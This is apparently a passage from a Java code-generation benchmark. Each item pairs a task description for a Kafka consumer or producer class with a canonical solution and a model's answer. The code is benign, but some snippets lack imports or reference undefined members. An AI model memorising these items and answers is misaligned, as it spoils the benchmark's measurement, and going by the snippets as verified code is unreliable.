    "right_result": "```java\nimport org.apache.kafka.clients.consumer.ConsumerConfig;\nimport org.apache.kafka.clients.consumer.ConsumerRecord;\nimport org.apache.kafka.clients.consumer.ConsumerRecords;\nimport org.apache.kafka.clients.consumer.KafkaConsumer;\nimport org.apache.kafka.common.TopicPartition;\nimport org.springframework.batch.item.ItemReader;\nimport org.springframework.batch.item.support.AbstractItemCountingItemStreamItemReader;\nimport org.springframework.util.Assert;\n\nimport java.time.Duration;\nimport java.util.*;\n\npublic class KafkaItemReader<K, V> extends AbstractItemCountingItemStreamItemReader<V> implements ItemReader<V> {\n\n    public static final String TOPIC_PARTITION_OFFSETS = \"topic.partition.offsets\";\n    public static final long DEFAULT_POLL_TIMEOUT = 30_000L;\n\n    private final Properties consumerProperties;\n    private final String topic;\n    private final List<TopicPartition> topicPartitions;\n    private Map<TopicPartition, Long> partitionOffsets;\n    private KafkaConsumer<K, V> kafkaConsumer;\n    private Iterator<ConsumerRecord<K, V>> consumerRecords;\n    private Duration pollTimeout;\n    private boolean saveState;\n\n    public KafkaItemReader(Properties properties, String topic, Integer... partitions) {\n        this(properties, topic, Arrays.asList(partitions));\n    }\n\n    public KafkaItemReader(Properties properties, String topic, List<Integer> partitions) {\n        Assert.notNull(properties, \"Consumer properties must not be null\");\n        Assert.hasText(topic, \"Topic must not be empty\");\n        Assert.notEmpty(partitions, \"Partitions must not be empty\");\n\n        this.consumerProperties = new Properties();\n        this.consumerProperties.putAll(properties);\n        this.topic = topic;\n        this.topicPartitions = new ArrayList<>();\n        for (Integer partition : partitions) {\n            this.topicPartitions.add(new TopicPartition(topic, partition));\n        }\n        this.pollTimeout = Duration.ofMillis(DEFAULT_POLL_TIMEOUT);\n        setSaveState(true);\n    }\n\n    @Override\n    public void open(ExecutionContext executionContext) {\n        if (executionContext.containsKey(TOPIC_PARTITION_OFFSETS)) {\n            this.partitionOffsets = (Map<TopicPartition, Long>) executionContext.get(TOPIC_PARTITION_OFFSETS);\n        } else {\n            this.partitionOffsets = new HashMap<>();\n        }\n\n        if (kafkaConsumer == null) {\n            kafkaConsumer = new KafkaConsumer<>(consumerProperties);\n            kafkaConsumer.assign(topicPartitions);\n\n            for (Map.Entry<TopicPartition, Long> entry : partitionOffsets.entrySet()) {\n                kafkaConsumer.seek(entry.getKey(), entry.getValue());\n            }\n        }\n\n        consumerRecords = fetchNextBatch().iterator();\n    }\n\n    private ConsumerRecords<K, V> fetchNextBatch() {\n        return kafkaConsumer.poll(pollTimeout);\n    }\n\n    @Override\n    public V read() throws Exception {\n        if (consumerRecords.hasNext()) {\n            ConsumerRecord<K, V> record = consumerRecords.next();\n            if (saveState && isSaveState()) {\n                updateOffset(record.partition(), record.offset() + 1);\n            }\n            return record.value();\n        }\n\n        ConsumerRecords<K, V> records = fetchNextBatch();\n        if (!records.isEmpty()) {\n            consumerRecords = records.iterator();\n            if (consumerRecords.hasNext()) {\n                ConsumerRecord<K, V> nextRecord = consumerRecords.next();\n                if (saveState && isSaveState()) {\n                    updateOffset(nextRecord.partition(), nextRecord.offset() + 1);\n                }\n                return nextRecord.value();\n            }\n        }\n\n        return null;\n    }\n\n    @Override\n    public void update(ExecutionContext executionContext) {\n        if (isSaveState()) {\n            executionContext.put(TOPIC_PARTITION_OFFSETS, new HashMap<>(partitionOffsets));\n        }\n        kafkaConsumer.commitSync();\n    }\n\n    @Override\n    public void close() {\n        if (kafkaConsumer != null) {\n            kafkaConsumer.close();\n        }\n    }\n\n    private void updateOffset(int partition, long offset) {\n        topicPartitions.stream()\n                .filter(tp -> tp.partition() == partition)\n                .findFirst()\n                .ifPresent(tp -> partitionOffsets.put(tp, offset));\n    }\n\n    public void setPollTimeout(Duration pollTimeout) {\n        this.pollTimeout = pollTimeout;\n    }\n\n    public void setSaveState(boolean saveState) {\n        this.saveState = saveState;\n    }\n\n    protected boolean isSaveState() {\n        return saveState;\n    }\n}\n```"
  },
  {
    "Task_id": 252,
    "Instruction": "Task Description: Create a Java class that implements a Kafka consumer thread for reading and processing messages from a Kafka topic, with support for message validation and local store updates.\n\nClass Description: KafkaStoreReaderThread is a thread-based Kafka consumer that reads messages from a specified topic, validates them using a handler, and updates a local store accordingly. It maintains offset tracking and provides shutdown capabilities.\n\nAttributes:\n- topic: String - The Kafka topic to consume messages from\n- topicPartition: TopicPartition - The topic partition being consumed\n- groupId: String - The consumer group ID\n- storeUpdateHandler: StoreUpdateHandler<K, V> - Handler for message validation\n- serializer: Serializer<K, V> - Serializer for message keys and values\n- localStore: Store<K, V> - Local storage for processed messages\n- offsetUpdateLock: ReentrantLock - Lock for thread-safe offset updates\n- offsetReachedThreshold: Condition - Condition for offset tracking\n- consumer: Consumer<byte[], byte[]> - Kafka consumer instance\n- offsetInSchemasTopic: long - Current offset in the topic\n- consumerProps: Properties - Configuration properties for the Kafka consumer\n\nMethods:\n- KafkaStoreReaderThread(String bootstrapBrokers, String topic, String groupId, StoreUpdateHandler<K, V> storeUpdateHandler, Serializer<K, V> serializer, Store<K, V> localStore) -> void - Constructor that initializes the consumer with configuration and dependencies\n- doWork() -> void - Main work method that polls for messages, processes them, and updates the local store\n- shutdown() -> void - Gracefully shuts down the consumer thread",
    "Canonical_solution": "import io.confluent.kafka.schemaregistry.storage.StoreUpdateHandler.ValidationStatus;\nimport io.confluent.kafka.schemaregistry.utils.ShutdownableThread;\nimport org.apache.kafka.clients.consumer.Consumer;\nimport org.apache.kafka.clients.consumer.KafkaConsumer;\nimport org.apache.kafka.clients.consumer.ConsumerRecords;\nimport org.apache.kafka.clients.consumer.ConsumerRecord;\nimport org.apache.kafka.clients.consumer.ConsumerConfig;\nimport org.apache.kafka.common.KafkaException;\nimport org.apache.kafka.common.PartitionInfo;\nimport org.apache.kafka.common.TopicPartition;\nimport org.apache.kafka.common.errors.RecordTooLargeException;\nimport org.apache.kafka.common.errors.WakeupException;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.util.List;\nimport java.util.Properties;\nimport java.util.Arrays;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.locks.Condition;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class KafkaStoreReaderThread<K, V> extends ShutdownableThread {\n\n  private static final Logger log = LoggerFactory.getLogger(KafkaStoreReaderThread.class);\n\n  private final String topic;\n  private final TopicPartition topicPartition;\n  private final String groupId;\n  private final StoreUpdateHandler<K, V> storeUpdateHandler;\n  private final Serializer<K, V> serializer;\n  private final Store<K, V> localStore;\n  private final ReentrantLock offsetUpdateLock;\n  private final Condition offsetReachedThreshold;\n  private Consumer<byte[], byte[]> consumer;\n  private long offsetInSchemasTopic = -1L;\n  private Properties consumerProps = new Properties();\n\n  public KafkaStoreReaderThread(String bootstrapBrokers,\n                              String topic,\n                              String groupId,\n                              StoreUpdateHandler<K, V> storeUpdateHandler,\n                              Serializer<K, V> serializer,\n                              Store<K, V> localStore) {\n    super(\"kafka-store-reader-thread-\" + topic, false);\n    offsetUpdateLock = new ReentrantLock();\n    offsetReachedThreshold = offsetUpdateLock.newCondition();\n    this.topic = topic;\n    this.groupId = groupId;\n    this.storeUpdateHandler = storeUpdateHandler;\n    this.serializer = serializer;\n    this.localStore = localStore;\n\n    consumerProps.put(ConsumerConfig.GROUP_ID_CONFIG, this.groupId);\n    consumerProps.put(ConsumerConfig.CLIENT_ID_CONFIG, \"KafkaStore-reader-\" + this.topic);\n    consumerProps.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapBrokers);\n    consumerProps.put(ConsumerConfig.AUTO_OFFSET_RESET_CONFIG, \"earliest\");\n    consumerProps.put(ConsumerConfig.ENABLE_AUTO_COMMIT_CONFIG, \"false\");\n    consumerProps.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG,\n                    org.apache.kafka.common.serialization.ByteArrayDeserializer.class);\n    consumerProps.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG,\n                    org.apache.kafka.common.serialization.ByteArrayDeserializer.class);\n\n    this.consumer = new KafkaConsumer<>(consumerProps);\n    this.topicPartition = new TopicPartition(topic, 0);\n    List<TopicPartition> topicPartitions = Arrays.asList(this.topicPartition);\n    this.consumer.assign(topicPartitions);\n    consumer.seekToBeginning(topicPartitions);\n  }\n\n  @Override\n  public void doWork() {\n    try {\n      ConsumerRecords<byte[], byte[]> records = consumer.poll(Duration.ofMillis(Long.MAX_VALUE));\n      for (ConsumerRecord<byte[], byte[]> record : records) {\n        K messageKey = this.serializer.deserializeKey(record.key());\n        V message = record.value() == null ? null : serializer.deserializeValue(messageKey, record.value());\n        \n        TopicPartition tp = new TopicPartition(record.topic(), record.partition());\n        long offset = record.offset();\n        long timestamp = record.timestamp();\n        ValidationStatus status = this.storeUpdateHandler.validateUpdate(\n                messageKey, message, tp, offset, timestamp);\n        \n        if (status == ValidationStatus.SUCCESS) {\n          if (message == null) {\n            localStore.delete(messageKey);\n          } else {\n            localStore.put(messageKey, message);\n          }\n        }\n\n        try {\n          offsetUpdateLock.lock();\n          offsetInSchemasTopic = record.offset();\n          offsetReachedThreshold.signalAll();\n        } finally {\n          offsetUpdateLock.unlock();\n        }\n      }\n    } catch (WakeupException we) {\n      // Thread is closing\n    } catch (RecordTooLargeException rtle) {\n      throw new IllegalStateException(\"Consumer threw RecordTooLargeException\", rtle);\n    } catch (RuntimeException e) {\n      log.error(\"KafkaStoreReader thread has died\", e);\n      throw e;\n    }\n  }\n\n  @Override\n  public void shutdown() {\n    super.initiateShutdown();\n    if (consumer != null) {\n      consumer.wakeup();\n    }\n    super.awaitShutdown();\n    if (consumer != null) {\n      consumer.close();\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 32,
    "right_result": "```java\nimport org.apache.kafka.clients.consumer.Consumer;\nimport org.apache.kafka.clients.consumer.ConsumerConfig;\nimport org.apache.kafka.clients.consumer.ConsumerRecords;\nimport org.apache.kafka.clients.consumer.KafkaConsumer;\nimport org.apache.kafka.common.TopicPartition;\n\nimport java.time.Duration;\nimport java.util.Collections;\nimport java.util.Properties;\nimport java.util.concurrent.locks.Condition;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class KafkaStoreReaderThread<K, V> extends Thread {\n    private final String topic;\n    private final TopicPartition topicPartition;\n    private final String groupId;\n    private final StoreUpdateHandler<K, V> storeUpdateHandler;\n    private final Serializer<K, V> serializer;\n    private final Store<K, V> localStore;\n    private final ReentrantLock offsetUpdateLock;\n    private final Condition offsetReachedThreshold;\n    private Consumer<byte[], byte[]> consumer;\n    private long offsetInSchemasTopic;\n    private final Properties consumerProps;\n\n    public KafkaStoreReaderThread(String bootstrapBrokers, String topic, String groupId,\n                                  StoreUpdateHandler<K, V> storeUpdateHandler, Serializer<K, V> serializer,\n                                  Store<K, V> localStore) {\n        this.topic = topic;\n        this.groupId = groupId;\n        this.storeUpdateHandler = storeUpdateHandler;\n        this.serializer = serializer;\n        this.localStore = localStore;\n        this.offsetUpdateLock = new ReentrantLock();\n        this.offsetReachedThreshold = offsetUpdateLock.newCondition();\n        this.offsetInSchemasTopic = 0;\n\n        consumerProps = new Properties();\n        consumerProps.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapBrokers);\n        consumerProps.put(ConsumerConfig.GROUP_ID_CONFIG, groupId);\n        consumerProps.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, \"org.apache.kafka.common.serialization.ByteArrayDeserializer\");\n        consumerProps.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, \"org.apache.kafka.common.serialization.ByteArrayDeserializer\");\n        consumerProps.put(ConsumerConfig.AUTO_OFFSET_RESET_CONFIG, \"earliest\");\n\n        consumer = new KafkaConsumer<>(consumerProps);\n        topicPartition = new TopicPartition(topic, 0);\n        consumer.assign(Collections.singletonList(topicPartition));\n    }\n\n    public void doWork() {\n        while (!Thread.interrupted()) {\n            ConsumerRecords<byte[], byte[]> records = consumer.poll(Duration.ofMillis(100));\n            for (var record : records) {\n                K key = serializer.deserializeKey(record.key());\n                V value = serializer.deserializeValue(record.value());\n\n                if (storeUpdateHandler.validate(key, value)) {\n                    localStore.update(key, value);\n                    offsetInSchemasTopic = record.offset();\n                }\n            }\n        }\n    }\n\n    public void shutdown() {\n        consumer.wakeup();\n        try {\n            join();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        } finally {\n            consumer.close();\n        }\n    }\n\n    @Override\n    public void run() {\n        doWork();\n    }\n}\n```"
  },
  {
    "Task_id": 253,
    "Instruction": "Task Description: Create a Kafka consumer class in Java that continuously polls messages from a specified Kafka topic and processes them asynchronously. The class should handle initialization and cleanup properly, and allow for graceful shutdown.\n\nClass Description: KafkaConsumeOrderWorkaround is a Spring component that implements a Kafka consumer worker thread. It consumes messages from a configured Kafka topic, commits offsets asynchronously, and can be gracefully stopped. The consumer runs in a separate thread to avoid blocking the main application.\n\nAttributes:\n- bootstrapServers: String - Kafka broker addresses injected from configuration\n- topicName: String - Kafka topic name to subscribe to, injected from configuration\n- consumerGroup: String - Consumer group ID (default: \"order\")\n- consumer: Consumer<Long, String> - Kafka consumer instance\n- pollingInterval: long - Polling interval in milliseconds (default: 250ms)\n- running: boolean - Flag to control the consumer thread's execution\n- consumerThread: Thread - The thread running the Kafka consumer\n\nMethods:\n- startConsuming() -> void - Initializes and starts the Kafka consumer thread. Configures consumer properties, creates consumer instance, subscribes to topic, and begins polling loop. Annotated with @PostConstruct to run after bean initialization.\n- stopConsuming() -> void - Signals the consumer thread to stop by setting running flag to false. Annotated with @PreDestroy to run before bean destruction.",
    "Canonical_solution": "import java.util.Collections;\nimport java.util.Properties;\nimport javax.annotation.PostConstruct;\nimport javax.annotation.PreDestroy;\nimport org.apache.kafka.clients.consumer.Consumer;\nimport org.apache.kafka.clients.consumer.ConsumerConfig;\nimport org.apache.kafka.clients.consumer.KafkaConsumer;\nimport org.apache.kafka.common.serialization.StringDeserializer;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\n@Component\npublic class KafkaConsumeOrderWorkaround {\n\n    @Value(\"${spring.cloud.stream.kafka.binder.brokers}\")\n    private String bootstrapServers;\n\n    @Value(\"${spring.cloud.stream.bindings.input.destination}\")\n    private String topicName;\n\n    private String consumerGroup = \"order\";\n    private Consumer<Long, String> consumer;\n    private long pollingInterval = 250;\n    private boolean running = true;\n    private Thread consumerThread;\n\n    @PostConstruct\n    public void startConsuming() {\n        consumerThread = new Thread(\"kafka-workaround-consumer\") {\n            public void run() {\n                final Properties props = new Properties();\n                props.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);\n                props.put(ConsumerConfig.GROUP_ID_CONFIG, consumerGroup);\n                props.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class.getName());\n                props.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class.getName());\n\n                consumer = new KafkaConsumer<>(props);\n                consumer.subscribe(Collections.singletonList(topicName));\n                while (running) {\n                    consumer.poll(pollingInterval);\n                    consumer.commitAsync();\n                }\n                consumer.close();\n            }\n        };\n        consumerThread.start();\n    }\n\n    @PreDestroy\n    public void stopConsuming() {\n        running = false;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 32,
    "right_result": "```java\nimport org.apache.kafka.clients.consumer.ConsumerConfig;\nimport org.apache.kafka.clients.consumer.ConsumerRecord;\nimport org.apache.kafka.clients.consumer.ConsumerRecords;\nimport org.apache.kafka.clients.consumer.KafkaConsumer;\nimport org.apache.kafka.common.serialization.LongDeserializer;\nimport org.apache.kafka.common.serialization.StringDeserializer;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\nimport javax.annotation.PostConstruct;\nimport javax.annotation.PreDestroy;\nimport java.time.Duration;\nimport java.util.Collections;\nimport java.util.Properties;\n\n@Component\npublic class KafkaConsumeOrderWorkaround {\n\n    @Value(\"${kafka.bootstrap-servers}\")\n    private String bootstrapServers;\n\n    @Value(\"${kafka.topic-name}\")\n    private String topicName;\n\n    @Value(\"${kafka.consumer-group:order}\")\n    private String consumerGroup;\n\n    private final long pollingInterval = 250;\n\n    private volatile boolean running = false;\n    private Thread consumerThread;\n    private KafkaConsumer<Long, String> consumer;\n\n    @PostConstruct\n    public void startConsuming() {\n        Properties props = new Properties();\n        props.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);\n        props.put(ConsumerConfig.GROUP_ID_CONFIG, consumerGroup);\n        props.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, LongDeserializer.class.getName());\n        props.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class.getName());\n        props.put(ConsumerConfig.AUTO_OFFSET_RESET_CONFIG, \"earliest\");\n\n        consumer = new KafkaConsumer<>(props);\n        consumer.subscribe(Collections.singletonList(topicName));\n\n        running = true;\n        consumerThread = new Thread(this::consumeLoop);\n        consumerThread.start();\n    }\n\n    private void consumeLoop() {\n        try {\n            while (running) {\n                ConsumerRecords<Long, String> records = consumer.poll(Duration.ofMillis(pollingInterval));\n                if (!records.isEmpty()) {\n                    for (ConsumerRecord<Long, String> record : records) {\n                        // Process message asynchronously here\n                        processMessage(record);\n                    }\n                    consumer.commitAsync();\n                }\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                consumer.close();\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void processMessage(ConsumerRecord<Long, String> record) {\n        // Implement asynchronous message processing logic\n        System.out.printf(\"Received message: key=%d, value='%s', partition=%d%n\",\n                record.key(), record.value(), record.partition());\n    }\n\n    @PreDestroy\n    public void stopConsuming() {\n        running = false;\n        if (consumerThread != null) {\n            try {\n                consumerThread.join(5000);\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 254,
    "Instruction": "Task Description: Create a Kafka producer class that handles message serialization and sending to a Kafka topic with configurable properties and error handling.\n\nClass Description: The KafkaStoreProducer class is a generic Kafka producer that serializes and sends key-value pairs to a specified Kafka topic. It provides configurable timeout settings and handles various Kafka-related exceptions.\n\nAttributes:\n- producer: KafkaProducer<byte[], byte[]> - The underlying Kafka producer instance\n- topic: String - The Kafka topic to which messages will be sent\n- serializer: Serializer<K, V> - The serializer for key-value pairs\n- timeout: int - The maximum time to wait for message acknowledgment in milliseconds\n\nMethods:\n- Constructor: KafkaStoreProducer(String bootstrapBrokers, String topic, Serializer<K, V> serializer, int timeout, Properties configProps) -> void - Initializes the Kafka producer with configuration properties including bootstrap servers, topic, serializer, timeout, and additional custom properties\n- put: put(K key, V value) -> V - Serializes and sends a key-value pair to the Kafka topic, returning the value if successful. Throws StoreTimeoutException if the operation times out or StoreException for other errors\n- close: close() -> void - Closes the Kafka producer and releases all resources",
    "Canonical_solution": "import io.confluent.kafka.schemaregistry.storage.exceptions.StoreException;\nimport io.confluent.kafka.schemaregistry.storage.exceptions.StoreTimeoutException;\nimport io.confluent.kafka.schemaregistry.storage.exceptions.SerializationException;\nimport io.confluent.kafka.schemaregistry.storage.serialization.Serializer;\nimport org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.apache.kafka.clients.producer.RecordMetadata;\nimport org.apache.kafka.common.errors.RecordTooLargeException;\nimport org.apache.kafka.common.serialization.ByteArraySerializer;\nimport java.util.Properties;\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.Future;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.TimeoutException;\n\npublic class KafkaStoreProducer<K, V> {\n\n    private final KafkaProducer<byte[], byte[]> producer;\n    private final String topic;\n    private final Serializer<K, V> serializer;\n    private final int timeout;\n\n    public KafkaStoreProducer(String bootstrapBrokers, String topic, \n                            Serializer<K, V> serializer, int timeout,\n                            Properties configProps) {\n        Properties props = new Properties();\n        props.putAll(configProps);\n        props.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapBrokers);\n        props.put(ProducerConfig.ACKS_CONFIG, \"-1\");\n        props.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, ByteArraySerializer.class);\n        props.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, ByteArraySerializer.class);\n        props.put(ProducerConfig.ENABLE_IDEMPOTENCE_CONFIG, true);\n\n        this.producer = new KafkaProducer<>(props);\n        this.topic = topic;\n        this.serializer = serializer;\n        this.timeout = timeout;\n    }\n\n    public V put(K key, V value) throws StoreTimeoutException, StoreException {\n        if (key == null) {\n            throw new StoreException(\"Key should not be null\");\n        }\n\n        ProducerRecord<byte[], byte[]> producerRecord;\n        try {\n            producerRecord = new ProducerRecord<>(\n                topic, \n                0, \n                this.serializer.serializeKey(key),\n                value == null ? null : this.serializer.serializeValue(value)\n            );\n        } catch (SerializationException e) {\n            throw new StoreException(\"Error serializing schema while creating the Kafka produce record\", e);\n        }\n\n        try {\n            Future<RecordMetadata> ack = producer.send(producerRecord);\n            RecordMetadata recordMetadata = ack.get(timeout, TimeUnit.MILLISECONDS);\n            return value;\n        } catch (InterruptedException e) {\n            throw new StoreException(\"Put operation interrupted while waiting for an ack from Kafka\", e);\n        } catch (ExecutionException e) {\n            if (e.getCause() instanceof RecordTooLargeException) {\n                throw new StoreException(\"Put operation failed because entry is too large\");\n            } else {\n                throw new StoreException(\"Put operation failed while waiting for an ack from Kafka\", e);\n            }\n        } catch (TimeoutException e) {\n            throw new StoreTimeoutException(\n                \"Put operation timed out while waiting for an ack from Kafka\", e);\n        } catch (KafkaException ke) {\n            throw new StoreException(\"Put operation to Kafka failed\", ke);\n        }\n    }\n\n    public void close() {\n        producer.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 31,
    "right_result": "```java\nimport org.apache.kafka.clients.producer.*;\nimport org.apache.kafka.common.serialization.Serializer;\n\nimport java.util.Properties;\nimport java.util.concurrent.Future;\n\npublic class KafkaStoreProducer<K, V> {\n    private final KafkaProducer<byte[], byte[]> producer;\n    private final String topic;\n    private final Serializer<K, V> serializer;\n    private final int timeout;\n\n    public KafkaStoreProducer(String bootstrapBrokers, String topic, Serializer<K, V> serializer, int timeout, Properties configProps) {\n        this.topic = topic;\n        this.serializer = serializer;\n        this.timeout = timeout;\n\n        Properties props = new Properties();\n        props.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapBrokers);\n        props.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, \"org.apache.kafka.common.serialization.ByteArraySerializer\");\n        props.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, \"org.apache.kafka.common.serialization.ByteArraySerializer\");\n        props.putAll(configProps);\n\n        this.producer = new KafkaProducer<>(props);\n    }\n\n    public V put(K key, V value) throws StoreException {\n        try {\n            byte[] serializedKey = serializer.serializeKey(key);\n            byte[] serializedValue = serializer.serializeValue(value);\n\n            ProducerRecord<byte[], byte[]> record = new ProducerRecord<>(topic, serializedKey, serializedValue);\n            Future<RecordMetadata> future = producer.send(record);\n\n            RecordMetadata metadata = future.get(timeout, java.util.concurrent.TimeUnit.MILLISECONDS);\n            if (metadata != null) {\n                return value;\n            } else {\n                throw new StoreException(\"Failed to send message to Kafka: No metadata returned.\");\n            }\n        } catch (java.util.concurrent.TimeoutException e) {\n            throw new StoreTimeoutException(\"Kafka message sending timed out after \" + timeout + \" ms.\", e);\n        } catch (Exception e) {\n            throw new StoreException(\"Error occurred while sending message to Kafka.\", e);\n        }\n    }\n\n    public void close() {\n        producer.close();\n    }\n}\n\nclass StoreException extends RuntimeException {\n    public StoreException(String message, Throwable cause) {\n        super(message, cause);\n    }\n}\n\nclass StoreTimeoutException extends StoreException {\n    public StoreTimeoutException(String message, Throwable cause) {\n        super(message, cause);\n    }\n}\n```"
  },
  {
    "Task_id": 255,
    "Instruction": "Task Description: Create a Kafka producer wrapper class in Java that simplifies sending JSON data to Kafka topics.\n\nClass Description: The KafkaProducerWrapper class provides a convenient interface for producing messages to Kafka topics. It handles producer creation, message serialization, and error handling internally.\n\nAttributes:\n- kafkaProducer: Producer<Long, String> - The underlying Kafka producer instance\n- kafkaBrokers: String - Comma-separated list of Kafka broker addresses\n- gson: Gson - JSON serializer/deserializer instance\n\nMethods:\n- createKafkaProducer() -> Producer<Long, String> - Creates and configures a new Kafka producer instance with the specified broker addresses and serializers\n- send2Kafka(JsonElement jsonElement, String topicName) -> void - Serializes the JSON element and sends it to the specified Kafka topic\n- close() -> void - Properly closes the Kafka producer to release resources",
    "Canonical_solution": "import org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.Producer;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.apache.kafka.common.serialization.LongSerializer;\nimport org.apache.kafka.common.serialization.StringSerializer;\nimport java.util.Properties;\nimport java.util.concurrent.ExecutionException;\nimport com.google.gson.JsonElement;\nimport com.google.gson.Gson;\n\npublic class KafkaProducerWrapper {\n\n    private Producer<Long, String> kafkaProducer;\n    private String kafkaBrokers;\n    private Gson gson = new Gson();\n\n    public KafkaProducerWrapper(String kafkaBrokers) {\n        this.kafkaBrokers = kafkaBrokers;\n        this.kafkaProducer = createKafkaProducer();\n    }\n\n    public Producer<Long, String> createKafkaProducer() {\n        Properties props = new Properties();\n        props.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, kafkaBrokers);\n        props.put(ProducerConfig.CLIENT_ID_CONFIG, Launcher.getInstanceId());\n        props.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, LongSerializer.class.getName());\n        props.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName());\n        props.put(ProducerConfig.MAX_BLOCK_MS_CONFIG, 10000);\n        return new KafkaProducer<>(props);\n    }\n\n    public void send2Kafka(JsonElement jsonElement, String topicName) {\n        ProducerRecord<Long, String> record = new ProducerRecord<>(topicName,\n                gson.toJson(jsonElement));\n        try {\n            kafkaProducer.send(record).get();\n        } \n        catch (ExecutionException e) {\n            logger.error(ExceptionUtils.getStackTrace(e));\n        } catch (InterruptedException e) {\n            logger.error(ExceptionUtils.getStackTrace(e));\n            Thread.currentThread().interrupt();\n        }\n    }\n\n    public void close() {\n        if (kafkaProducer != null) {\n            kafkaProducer.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 31,
    "right_result": "```java\nimport org.apache.kafka.clients.producer.*;\nimport org.apache.kafka.common.serialization.StringSerializer;\nimport com.google.gson.Gson;\nimport com.google.gson.JsonElement;\n\nimport java.util.Properties;\n\npublic class KafkaProducerWrapper {\n    private final Producer<Long, String> kafkaProducer;\n    private final String kafkaBrokers;\n    private final Gson gson;\n\n    public KafkaProducerWrapper(String kafkaBrokers) {\n        this.kafkaBrokers = kafkaBrokers;\n        this.gson = new Gson();\n        this.kafkaProducer = createKafkaProducer();\n    }\n\n    private Producer<Long, String> createKafkaProducer() {\n        Properties props = new Properties();\n        props.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, kafkaBrokers);\n        props.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, \"org.apache.kafka.common.serialization.LongSerializer\");\n        props.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName());\n        props.put(ProducerConfig.ACKS_CONFIG, \"1\");\n        props.put(ProducerConfig.RETRIES_CONFIG, 0);\n\n        return new KafkaProducer<>(props);\n    }\n\n    public void send2Kafka(JsonElement jsonElement, String topicName) {\n        String jsonMessage = gson.toJson(jsonElement);\n        ProducerRecord<Long, String> record = new ProducerRecord<>(topicName, jsonMessage);\n        kafkaProducer.send(record, (metadata, exception) -> {\n            if (exception != null) {\n                exception.printStackTrace();\n            } else {\n                System.out.printf(\"Sent message to topic %s partition %d%n\", metadata.topic(), metadata.partition());\n            }\n        });\n    }\n\n    public void close() {\n        if (kafkaProducer != null) {\n            kafkaProducer.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 260,
    "Instruction": "Task Description: Create a Java class that implements a Kafka Producer for sending maintenance plan messages to a Kafka topic.\n\nClass Description: The MaintenancePlanProducer class is responsible for producing and sending maintenance plan messages to a specified Kafka topic. It handles the configuration of the Kafka Producer, message sending, and resource cleanup.\n\nAttributes:\n- _producer: Producer<String, MaintenancePlan> - The Kafka Producer instance used to send messages to Kafka.\n\nMethods:\n- MaintenancePlanProducer(String bootstrapServers, Properties overrides) -> void - Constructor that initializes the Kafka Producer with the given bootstrap servers and optional configuration overrides.\n  - Input Parameters:\n    - bootstrapServers: String - Comma-separated list of Kafka broker addresses\n    - overrides: Properties - Optional additional Kafka Producer configuration properties\n- sendPlan(String topic, MaintenancePlan maintenancePlan) -> void - Sends a maintenance plan to the specified Kafka topic.\n  - Input Parameters:\n    - topic: String - The Kafka topic to send the message to\n    - maintenancePlan: MaintenancePlan - The maintenance plan object to be sent\n- close() -> void - Closes the Kafka Producer and releases all resources.\n  - No input parameters",
